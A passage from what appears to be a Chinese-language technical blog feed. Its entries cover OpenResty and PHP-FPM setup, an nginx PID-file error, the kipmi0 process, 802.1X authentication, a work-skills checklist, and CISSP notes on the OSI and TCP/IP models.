class="hljs-params">--with-http_realip_module</span> <span class="hljs-params">--with-http_stub_status_module</span> <span class="hljs-params">--with-http_gzip_static_module</span> <span class="hljs-params">--with-pcre-jit</span> <span class="hljs-params">--with-threads</span> <span class="hljs-params">--with-file-aio</span> <span class="hljs-params">--with-compat</span> <span class="hljs-params">--with-stream</span> <span class="hljs-params">--without-pcre2</span> <span class="hljs-params">--with-stream_ssl_module</span> <span class="hljs-params">--with-stream_ssl_preread_module</span><br></code></pre></td></tr></table></figure><h1 id="openresty-php"><a href="#openresty-php" class="headerlink" title="openresty+php"></a>openresty+php</h1><p>OpenResty 本身是基于 Nginx 和 Lua 的高性能 Web 平台，主要用于处理 Lua 脚本。它并不直接支持 PHP，但可以通过与 PHP-FPM（FastCGI Process Manager）集成来运行 PHP 程序。</p><h3 id="安装-PHP-FPM"><a href="#安装-PHP-FPM" class="headerlink" title="安装 PHP-FPM"></a>安装 PHP-FPM</h3><p>检查是否安装 PHP-FPM</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status php-fpm</span><br></code></pre></td></tr></table></figure><p>没有安装提示‘Unit php-fpm.service could not be found’</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">[root@ <span class="hljs-keyword">system</span>]# systemctl status php-fpm<br>Unit php-fpm.service could not be found.<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> php-fpm<br></code></pre></td></tr></table></figure><p>安装 PHP-FPM</p><p>CentOS</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">yum install  php-fpm php-cli php-mysql php-curl php-gd php-mbstring php-<span class="hljs-keyword">xml</span> <span class="hljs-title">php-zip</span><br></code></pre></td></tr></table></figure><p>Ubuntu</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo apt update<br>sudo apt install php-fpm php-cli php-mysql php-curl php-gd php-mbstring php-<span class="hljs-keyword">xml</span> <span class="hljs-title">php-zip</span><br></code></pre></td></tr></table></figure><p>启动 PHP-FPM</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl start php-fpm<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> php-fpm<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ system]<span class="hljs-comment"># ps -ef | grep php-fpm</span><br>root    <span class="hljs-number"> 12193 </span>   <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: master process (/etc/php-fpm.conf)<br>apache  <span class="hljs-number"> 12194 </span>12193 <span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: pool www<br>apache  <span class="hljs-number"> 12195 </span>12193 <span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: pool www<br>apache  <span class="hljs-number"> 12196 </span>12193 <span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: pool www<br>apache  <span class="hljs-number"> 12197 </span>12193 <span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: pool www<br>apache  <span class="hljs-number"> 12198 </span>12193 <span class="hljs-number"> 0 </span>16:21 ?        00:00:00 php-fpm: pool www<br>root    <span class="hljs-number"> 12244 </span><span class="hljs-number"> 2409 </span><span class="hljs-number"> 0 </span>16:21 pts/5    00:00:00 grep --color=auto php-fpm<br></code></pre></td></tr></table></figure><h3 id="配置-PHP-FPM"><a href="#配置-PHP-FPM" class="headerlink" title="配置 PHP-FPM"></a>配置 PHP-FPM</h3><p>PHP-FPM  配置文件常位于 &#x2F;etc&#x2F;php-fpm.d&#x2F;<a href="http://www.conf/">www.conf</a></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ system]<span class="hljs-comment"># ls /etc/php</span><br>php.d<span class="hljs-symbol">/</span>        php-fpm.conf  php-fpm.d<span class="hljs-symbol">/</span>    php.ini<br></code></pre></td></tr></table></figure><p>修改 &#x2F;etc&#x2F;php-fpm.d&#x2F;<a href="http://www.conf/">www.conf</a> </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">listen = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>  <span class="hljs-comment"># PHP-FPM 监听的地址和端口</span><br><span class="hljs-keyword">user</span> <span class="hljs-title">= apache</span>             <span class="hljs-comment"># 运行 PHP-FPM 的用户</span><br><span class="hljs-keyword">group</span> <span class="hljs-title">= apache</span>            <span class="hljs-comment"># 运行 PHP-FPM 的用户组</span><br></code></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart php-fpm<br></code></pre></td></tr></table></figure><h3 id="openresty-php-1"><a href="#openresty-php-1" class="headerlink" title="openresty + php"></a>openresty + php</h3><h4 id="修改openresty配置"><a href="#修改openresty配置" class="headerlink" title="修改openresty配置"></a>修改openresty配置</h4><p>&#x2F;usr&#x2F;local&#x2F;openresty&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com;  <span class="hljs-comment"># 替换为你的域名或 IP 地址</span><br><br>    <span class="hljs-attribute">root</span> /var/www/html;          <span class="hljs-comment"># PHP 文件存放的根目录</span><br>    <span class="hljs-attribute">index</span> index.php index.html index.htm;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ =<span class="hljs-number">404</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>        <span class="hljs-attribute">include</span> fastcgi_params;<br>        <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">127.0.0.1:9000</span>;  <span class="hljs-comment"># PHP-FPM 监听的地址和端口</span><br>        <span class="hljs-attribute">fastcgi_index</span> index.php;<br>        <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ /\.ht</span> &#123;<br>        <span class="hljs-attribute">deny</span> all;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="重启-OpenResty-服务"><a href="#重启-OpenResty-服务" class="headerlink" title="重启 OpenResty 服务"></a>重启 OpenResty 服务</h4><p>sudo systemctl restart openresty</p><h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><h2 id="nginx-s-reload-nginx-pid"><a href="#nginx-s-reload-nginx-pid" class="headerlink" title="nginx -s reload nginx.pid"></a>nginx -s reload nginx.pid</h2><h3 id="报错内容"><a href="#报错内容" class="headerlink" title="报错内容"></a>报错内容</h3><p>nginx -s reload 时提示如下错误</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">nginx: [<span class="hljs-keyword">error</span>] <span class="hljs-keyword">open</span>() <span class="hljs-string">&quot;/usr/local/openresty/nginx/logs/nginx.pid&quot;</span> failed (2: <span class="hljs-keyword">No</span> such <span class="hljs-keyword">file</span> or directory)<br></code></pre></td></tr></table></figure><h3 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h3><p>1、Nginx 无法找到或访问其 PID 文件（<code>nginx.pid</code>）。PID 文件用于存储 Nginx 主进程的进程 ID，Nginx 需要它来管理进程（如停止或重新加载）。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、检查 nginx 是否启动，如没有启动，启动 nginx 即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> nginx<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openresty/</span>nginx<span class="hljs-regexp">/sbin/</span>nginx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>openresty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_process</title>
    <link href="/2025/02/25/yunwei/yunweibase/Linuxbase/linux_process/"/>
    <url>/2025/02/25/yunwei/yunweibase/Linuxbase/linux_process/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>对Linux系统中存在的进程进行分析归纳</p><h1 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h1><h2 id="kipmi"><a href="#kipmi" class="headerlink" title="kipmi*"></a>kipmi*</h2><p><code>kipmi0</code> 是 Linux 系统中的一个内核进程，全称为 <strong>Kernel IPMI (Intelligent Platform Management Interface) driver</strong>。它是与 IPMI 相关的内核模块的一部分，用于支持和管理基于 IPMI 的硬件监控和控制功能。</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweibase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweibase</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/02/21/security/itsec/%E5%AE%89%E5%85%A8%E5%87%86%E5%85%A5/portal%E5%87%86%E5%85%A5/"/>
    <url>/2025/02/21/security/itsec/%E5%AE%89%E5%85%A8%E5%87%86%E5%85%A5/portal%E5%87%86%E5%85%A5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>802.1x认证</title>
    <link href="/2025/02/21/security/itsec/%E5%AE%89%E5%85%A8%E5%87%86%E5%85%A5/802.1x%E8%AE%A4%E8%AF%81/"/>
    <url>/2025/02/21/security/itsec/%E5%AE%89%E5%85%A8%E5%87%86%E5%85%A5/802.1x%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="802-1X-简介"><a href="#802-1X-简介" class="headerlink" title="802.1X 简介"></a>802.1X 简介</h1><p>802.1X 是一种基于端口的网络访问控制协议，主要用于设备接入网络是进行身份认证和授权。</p><h1 id="802-1X-角色"><a href="#802-1X-角色" class="headerlink" title="802.1X 角色"></a>802.1X 角色</h1><p>客户端</p><p>认证系统</p><p>认证服务器</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h1 id="EAP认证方法"><a href="#EAP认证方法" class="headerlink" title="EAP认证方法"></a>EAP认证方法</h1><p>EAP 是 802.1X 的核心协议框架，支持多种扩展认证方法</p><h2 id="EAP-TLS"><a href="#EAP-TLS" class="headerlink" title="EAP-TLS"></a>EAP-TLS</h2><p>基于数字证书的双向认证（客户端和服务器均需证书），安全性高，但证书管理复杂。</p><h2 id="EAP-PEAP"><a href="#EAP-PEAP" class="headerlink" title="EAP-PEAP"></a>EAP-PEAP</h2><p>建立 TLS 隧道保护认证过程，内部使用 MS-CHAPv2 或 EAP-GTC 验证密码，适合企业环境。</p><h2 id="EAP-TTLS"><a href="#EAP-TTLS" class="headerlink" title="EAP-TTLS"></a>EAP-TTLS</h2><p>类似 PEAP，支持更多内部认证协议（如 PAP、CHAP）。</p><h2 id="EAP-MD5"><a href="#EAP-MD5" class="headerlink" title="EAP-MD5"></a>EAP-MD5</h2><p>简单但安全性低（仅单向认证），不推荐生产环境使用。</p><h2 id="EAP-SIM-AKA"><a href="#EAP-SIM-AKA" class="headerlink" title="EAP-SIM&#x2F;AKA"></a>EAP-SIM&#x2F;AKA</h2><p>用于移动网络，基于 SIM 卡或 USIM 认证。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>技能表</title>
    <link href="/2025/02/20/security/secstudy/%E6%8A%80%E8%83%BD%E8%A1%A8/"/>
    <url>/2025/02/20/security/secstudy/%E6%8A%80%E8%83%BD%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>来源：</p><p><a href="https://paper.seebug.org/RD_Checklist/index.html">https://paper.seebug.org/RD_Checklist/index.html</a></p><h1 id="通用技能"><a href="#通用技能" class="headerlink" title="通用技能"></a>通用技能</h1><h2 id="如何做事"><a href="#如何做事" class="headerlink" title="如何做事"></a>如何做事</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>拆分细化为多个点</li><li>排好优先级</li></ul><p><strong>任务四象限</strong></p><ul><li>重要紧急<ul><li>赶紧搞定</li></ul></li><li>重要不紧急<ul><li>时刻保持关注，避免变成「重要紧急」</li></ul></li><li>不重要紧急<ul><li>少少益善，学会拒绝</li></ul></li><li>不重要不紧急<ul><li>靠自律</li></ul></li></ul><h3 id="SMART原则"><a href="#SMART原则" class="headerlink" title="SMART原则"></a>SMART原则</h3><ul><li>S：任务是否明确<ul><li>不明确的任务搞起来就是浪费生命</li></ul></li><li>M：任务是否可以度量<ul><li>不可度量如何体现价值？</li></ul></li><li>A：任务是否可以搞定<ul><li>搞不定就不应该接，接就得有魄力搞定</li></ul></li><li>R：任务的相关性如何<ul><li>决定了任务的价值，相关性越高越能体现价值，比如这个任务搞定了能让团队获得公司、客户等更大的认可</li></ul></li><li>T：任务的时间<ul><li>Timeline：任务时间轴，什么时间点需要搞定什么</li><li>Deadline：任务的最后期限，做评估时最好提前，因为总会有各种意外或拖延本性</li><li>Timeline：上一些很关键的时间点我们可以称为里程碑，搞定每个里程碑应该庆祝下</li></ul></li></ul><h2 id="成长"><a href="#成长" class="headerlink" title="成长"></a>成长</h2><h3 id="新事物的敏感性"><a href="#新事物的敏感性" class="headerlink" title="新事物的敏感性"></a>新事物的敏感性</h3><ul><li>保持好奇心</li><li>不要局限在自己的圈子，适当跨界吸收灵感</li><li>订阅国内外优秀博客&#x2F;资源</li><li>选择性参与一些必要的会议，听必要的主题，讨论必要的话题</li></ul><h3 id="关于知识"><a href="#关于知识" class="headerlink" title="关于知识"></a>关于知识</h3><ul><li>好记性不如烂笔头，勤做笔记所带来的收益远超你想象</li><li>尽快尽早的将自己的知识形成系统化认知，会达到事半功倍的效果</li><li>对知识的渴望程度决定了前进动力的大小</li><li>当知识很廉价地摆在你面前，你反而不会珍惜</li><li>对知识保持敬畏之心</li></ul><h3 id="关于信息获取"><a href="#关于信息获取" class="headerlink" title="关于信息获取"></a>关于信息获取</h3><ul><li>拓宽自己获取信息的渠道，但不要陷入低信噪比的泥潭</li><li>信息筛选 + 与你相关性如何？ + 整体可信度多高？ + 有效信息量多少？</li><li>处理并重新组织为你自己的理解</li></ul><h3 id="不要让自己成为矫情-浮夸的人"><a href="#不要让自己成为矫情-浮夸的人" class="headerlink" title="不要让自己成为矫情&#x2F;浮夸的人"></a>不要让自己成为矫情&#x2F;浮夸的人</h3><h3 id="和比你厉害的人在一起，和一流的人工作"><a href="#和比你厉害的人在一起，和一流的人工作" class="headerlink" title="和比你厉害的人在一起，和一流的人工作"></a>和比你厉害的人在一起，和一流的人工作</h3><ul><li>指点往往是精华</li><li>杜绝笨蛋爆炸<ul><li>二流的人招进来的人不太可能是一流的</li><li>久而久之一个团队就笨蛋爆炸了</li></ul></li></ul><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>批判性思考</li><li>解构与系统化思考</li><li>换位思考<ul><li>对于一个团队来说，这点太关键</li></ul></li></ul><h3 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h3><ul><li>遇到问题先独立思考，尝试独立解决，尽最大努力后再提问<ul><li>《你尽力了吗？》 <a href="https://paper.seebug.org/papers/scz/body/200004171952.txt">https://paper.seebug.org/papers/scz/body/200004171952.txt</a></li></ul></li><li>提问时，礼貌很关键（对知识的敬畏），清晰表达很关键</li><li>解决后，分享出来帮助更多需要帮助的人</li></ul><h3 id="小事心态"><a href="#小事心态" class="headerlink" title="小事心态"></a>小事心态</h3><ul><li>越基础的事越关键，越需要细心</li><li>不要一味盲目追求「高级感」，而忽视「小事」&#x2F;「简单事」&#x2F;「基础事」</li><li>基础不牢、地动山摇</li><li>小事做不好，别提大事</li></ul><h3 id="无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳"><a href="#无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳" class="headerlink" title="无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳"></a>无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secstudy</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11-域4通信与网络安全+域7安全运营-安全网络架构和组件</title>
    <link href="/2025/02/20/security/seccert/cissp/11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/"/>
    <url>/2025/02/20/security/seccert/cissp/11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="OSI-模型"><a href="#OSI-模型" class="headerlink" title="OSI 模型"></a>OSI 模型</h1><h2 id="OSI-模型的历史"><a href="#OSI-模型的历史" class="headerlink" title="OSI 模型的历史"></a>OSI 模型的历史</h2><p>OSI 模型的开发旨在给所有计算机系统建立通用的通信结构或标准。</p><h2 id="OSI-功能"><a href="#OSI-功能" class="headerlink" title="OSI 功能"></a>OSI 功能</h2><p>OSI 将网络任务划分为 7 层。</p><p>每层执行特定的任务或操作，以支持两台计算机之间的数据交换（即网络通信）。</p><p>应用层 7</p><p>表示层 6</p><p>会话层 5</p><p>传输层 4</p><p>网络层 3</p><p>数据链路层 2</p><p>物理层 1</p><h2 id="封装解封"><a href="#封装解封" class="headerlink" title="封装解封"></a>封装解封</h2><p>OSI 模型代表的是多个协议（即多层协议）分层集合的协议栈。</p><p>协议层之间的通信通过封装、解封实现。</p><p>封装是指将每层从上面层接收的数据传递到下一层之前，为数据添加头部，也可能添加尾部。本层的载荷和头部或尾部构成下一层的有效载荷。</p><p>数据从物理层到应用层向上移动的逆操作为解封。</p><p>封装信息通常只在消息的开头（头部）增加，只有部分层会在消息的结尾（尾部）增加。</p><p>解封过程中，每层删除的信息包含指令、校验和等，只有最初添加或创建信息的对等层能理解。</p><p>应用层7、表示层6、会话层5 ：封装的网络容器为协议数据单元（PDU）</p><p>传输层4 :  封装的网络容器为 TCP&#x2F; UDP</p><p>网络层3 :  封装的网络容器为数据包</p><p>数据链路层2 ：封装的网络容器为帧</p><p>物理层1 ：封装的网络容器转换为比特</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/image-20250225194747849.png" alt="image-20250225194747849"></p><h2 id="OSI-模型层次"><a href="#OSI-模型层次" class="headerlink" title="OSI 模型层次"></a>OSI 模型层次</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>应用层（第 7 层）将用户应用程序、网络服务或操作系统与协议栈相关联。软件应用程序不在此列表中。</p><p>传输文件、交换消息、连接到远程终端等所需的协议和服务在这层，例如 RDP（远程桌面协议）。</p><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p>表示层（第 6 层）将通用或标准化的结构和格式强加在数据之上。</p><p>表示层还负责加密和压缩。</p><p>在 TCP&#x2F;IP 网络上， 没有实际的表示层。</p><p>与网络通信相关的加密至少可以在五个位置进行：</p><p><strong>预先加密</strong>，软件在将数据发送到应用层之前进行加密。</p><p>传输层加密通常由 TLS 执行。</p><p>VPN 加密，可以发生在第 2 层、第 3 层或第 4 层，取决于使用的 VPN 技术，例如 L2TP（Layer 2 Tunneling Protocol，第 2 层隧道协议）、IPsec（Internet Protocol Security，互联网协议安全，第 3 层网络层协议）、OpenVPN（第 7 层 应用层协议，但依赖第 4 层传输层协议加密）</p><p>数据链路层的无线加密。</p><p>物理层的批量加密（由网络外部的设备提供）。</p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p>会话层（第 5 层）负责建立、维护和终止两台计算机之间的通信会话。</p><p>会话层管理对话规则或对话控制（单工、半双工、全双工），建立分组和恢复的检查点，并重传自上次验证检查点以来失败或丢失的 PDU。</p><p>TCP&#x2F;IP 网络上，没有实际的会话层，会话层功能由 TCP 在传输层处理，UDP 不处理。</p><p>通信会话三种约束或控制模式：</p><p>单工：单向通信</p><p>半双工：双向通信，但一次只能向一个方向发送数据。</p><p>全双工：双向通信，可以同时向两个方向发送数据。</p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层（第 4 层）负责管理连接的完整性并控制会话。</p><p>传输层在节点（也称为设备）之间建立通信连接并定义会话规则。</p><p>会话规则指定每个段可包含多少数据，如何验证消息的完整性，以及如何确定数据是否已丢失，该规则通过 TCP 握手阶段建立。</p><p>传输层在两个设备之间建立逻辑连接，并提供端到端传输服务以确保数据传输。该层包括用于分段、排序、错误检查、控制数据流、纠错、多路复用和网络服务优化的机制。</p><p><strong>传输层协议</strong></p><p>传输控制协议（Transmission Control Protocol，TCP）</p><p>用户数据协议（User Datagram Protocol，UDP）</p><p>传输层安全（Transport Layer Security，TLS）</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>网络层（第 3 层）负责逻辑寻址和执行路由。</p><p>当地址由软件或协议分配和使用，而不是由硬件提供和控制时，就会发生逻辑寻址。</p><p>数据包的包头包含源地址IP和目的地址IP。</p><p>网络层负责提供路由或传递导航信息，但是不负责验证信息是否传递成功。</p><p>网络层还管理错误检测和节点数据流量（即流量控制）。</p><p>路由器是第三层网络层运行的基本网络硬件设备。路由器根据速率、跳数、首选项等确定数据包传输的最佳逻辑路径。</p><h4 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h4><h5 id="内部路由协议"><a href="#内部路由协议" class="headerlink" title="内部路由协议"></a>内部路由协议</h5><h6 id="距离矢量"><a href="#距离矢量" class="headerlink" title="距离矢量"></a>距离矢量</h6><p>距离矢量路由 协议维护目标网络的列表，和以跳数度量的方向和距离度量（即到达目的地的路由器数量）。</p><p>常见矢量路由协议：RIP、IGRP（被高级距离向量路由协议，增强型内部网关路由协议 EIGRP 替换）。</p><h6 id="链路状态"><a href="#链路状态" class="headerlink" title="链路状态"></a>链路状态</h6><p>链路状态路由 协议收集路由特性，将速率、延迟、误码率和实际使用的资金成本等信息制成表格，以作出下一跳的路由决策。</p><p>常见链路状态路由协议：OSPF、IS-IS。</p><h5 id="外部路由协议"><a href="#外部路由协议" class="headerlink" title="外部路由协议"></a>外部路由协议</h5><h6 id="路径向量路由协议"><a href="#路径向量路由协议" class="headerlink" title="路径向量路由协议"></a>路径向量路由协议</h6><p>根据到目的地的整个剩余路径（即向量）做出下一跳决策。</p><p>内部路由协议仅根据相关信息决策下一跳，是短视的。</p><p>外部路由协议是远见的。</p><p>常见外部路由协议：边界网关协议 BGP</p><h4 id="路由器安全"><a href="#路由器安全" class="headerlink" title="路由器安全"></a>路由器安全</h4><p>1、限制仅接受经过身份认证路由器的路由更新</p><p>2、从物理和逻辑上限制路由器管理访问功能只允许指定实体</p><p>3、保持路由器固件更新</p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>数据链路层（第 2 层）负责数据包格式化为传输格式。</p><p>正确传输格式由网络硬件、拓扑和技术决定，例如：以太网（IEEE 802.3）。</p><p>对数据链路层的网络容器处理包括将源和目的硬件地址添加到帧。</p><p>硬件地址也就是 MAC 地址、NIC地址、以太网地址，是 6 字节（48位）的二进制地址，以十六进制表示法编写，例如：00-13-02-lF-58-FS</p><p>地址的前 3 个字节（24位）是组织唯一标识符（OUI），表示网络提供商或制造商。</p><p>地址解析协议 ARP。</p><p>数据链路层运行的网络硬件设备是交换机和网桥，支持基于 MAC 的流量路由。</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>物理层（第 1 层）将帧转换为比特，以便于通过物理连接介质进行传输。</p><p>物理层运行的网络硬件设备是NIC（Network Interface Card，网络接口卡，也就是网卡）、集线器、中继器、集中器和放大器。</p><h1 id="TCP-IP-模型"><a href="#TCP-IP-模型" class="headerlink" title="TCP &#x2F; IP 模型"></a>TCP &#x2F; IP 模型</h1><p>TCP &#x2F; IP 模型也称为 DARPA 模型 或 DOD 模型，仅由 四层 组成。</p><p>TCP &#x2F; IP 模型为四层模型，OSI 模型为七层模型。</p><p>TCP &#x2F; IP 模型由 应用层（也称为进程）、传输层（也称为主机到主机）、互联网层（也称为网络互联）、链路层 构成。</p><p><img src="/../11-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%9E%B6%E6%9E%84%E5%92%8C%E7%BB%84%E4%BB%B6/image-20250225092301241.png" alt="image-20250225092301241"></p><p>TCP &#x2F; IP 容易受到缓冲区溢出攻击、SYN 洪水攻击、各种拒绝服务（DoS）攻击、碎片攻击、超大数据包攻击、欺骗攻击、中间人攻击（路径攻击）、劫持攻击和编码错误攻击。</p><p>TCP &#x2F; IP 也会受到监视或嗅探等被动攻击。</p><h1 id="网络流量分析"><a href="#网络流量分析" class="headerlink" title="网络流量分析"></a>网络流量分析</h1><p>网络流量分析是管理网络的基本功能。</p><p>用于跟踪恶意通信、检测错误或解决传输问题。</p><p>协议分析器是用于检查网络流量内容的工具，是一种帧&#x2F;数据包捕获工具，捕获数据存储在内存或其他存储设备，对数据内容进行分析。</p><p>协议分析器也可以被称为嗅探器、网络评估器、网络分析器、流量监视器或包捕获实体。嗅探器通常是一种数据包(或帧)捕获工具，而协议分析器能够解码和解释数据包&#x2F;帧 内容。</p><p>协议分析器通常将 NIC（网卡）设置为混杂模式，捕获本地网络所有以太网帧。</p><p>协议分析器可以检查单个帧，直到二进制级别。</p><p>常见协议分析器：开源 Wireshark，商业 Omnipeek、NetWitness 和 </p><p>NetScout）</p><h1 id="通用应用层协议"><a href="#通用应用层协议" class="headerlink" title="通用应用层协议"></a>通用应用层协议</h1><p><strong>Telnet</strong>：TCP 23 端口，终端仿真网络应用程序，支持远程连接以执行命令和运行应用程序，但不是支持文件传输。<strong>不应该使用 Telnet，应该使用SSH。</strong></p><p><strong>FTP</strong>：TCP 20 端口（活动数据连接）&#x2F;短暂（被动数据连接）和 TCP 21 